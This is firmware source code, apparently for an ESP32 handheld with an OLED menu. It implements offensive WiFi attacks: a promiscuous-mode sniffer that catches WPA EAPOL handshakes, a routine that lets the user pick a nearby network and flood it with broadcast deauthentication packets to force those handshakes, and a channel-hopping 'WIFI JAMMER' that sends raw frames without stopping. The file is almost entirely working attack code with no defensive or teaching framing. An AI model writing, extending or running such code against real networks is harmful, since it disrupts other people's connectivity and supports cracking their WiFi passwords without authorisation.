void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeCapturing) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapolCount++;
            handshakes += "[HANDSHAKE] " + currentTargetSSID + "\n";
            saveData();
            showMessage("HANDSHAKE CAPTURED!", 2000);
            handshakeCapturing = false;
            return;
        }
    }
}

void startHandshake() {
    if (networkCount == 0) { showMessage("SCAN FIRST!", 1000); return; }
    int targetIdx = 0;
    while (true) {
        u8g2.clearBuffer();
        drawTopBar();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "SELECT TARGET:");
        for (int i = 0; i < min(networkCount, 5); i++) {
            int y = 30 + i * 10;
            if (i == targetIdx) {
                u8g2.drawBox(0, y-8, 128, 10);
                u8g2.setDrawColor(0);
                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
                u8g2.setDrawColor(1);
            } else {
                u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str());
            }
        }
        u8g2.drawStr(2, 62, "UP/DN=sel  OK=enter  BACK=cancel");
        u8g2.sendBuffer();
        if (btn(BTN_UP) && targetIdx > 0) targetIdx--;
        else if (btn(BTN_DOWN) && targetIdx < min(networkCount, 5)-1) targetIdx++;
        else if (btn(BTN_OK)) break;
        else if (btn(BTN_BACK)) return;
        delay(50);
    }
    currentTargetSSID = networkNames[targetIdx];
    memcpy(targetBSSID, networkBSSID[targetIdx], 6);
    esp_wifi_set_channel(networkChannel[targetIdx], WIFI_SECOND_CHAN_NONE);
    handshakeCapturing = true;
    eapolCount = 0;
    showMessage("CAPTURING...", 1500);
    unsigned long start = millis();
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (handshakeCapturing && millis() - start < 30000) {
        sendDeauthPacket(targetBSSID, broadcast);
        if (btn(BTN_BACK)) handshakeCapturing = false;
        delay(100);
    }
    handshakeCapturing = false;
    if (eapolCount > 0) showMessage("HANDSHAKE SAVED!", 1500);
    else showMessage("FAILED", 1500);
}

void startJammer() {
    wifiJamActive = true;
    showMessage("WIFI JAMMER", 1000);
    while (wifiJamActive) {
        for (int ch = 1; ch <= 11; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            uint8_t packet[128];
            for (int i = 0; i < 10; i++) esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
            if (btn(BTN_BACK)) { wifiJamActive = false; break; }
        }
        delay(5);
    }
    showMessage("JAMMER STOPPED", 1000);
}

